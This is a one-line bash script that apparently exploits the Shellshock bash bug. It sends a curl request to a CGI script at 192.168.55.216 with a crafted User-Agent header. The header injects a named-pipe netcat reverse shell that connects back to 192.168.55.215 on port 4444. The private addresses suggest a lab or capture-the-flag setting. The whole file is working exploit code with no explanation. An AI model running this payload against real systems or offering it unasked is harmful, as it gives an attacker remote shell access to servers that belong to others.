#!/bin/bash
curl -k -H 'User-Agent: () { :;}; /bin/bash -c "echo \"Content-type: text/html\r\n\r\n\"; echo \"\"; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.55.215 4444 >/tmp/f;"' 192.168.55.216/cgi-bin/ss.cgi

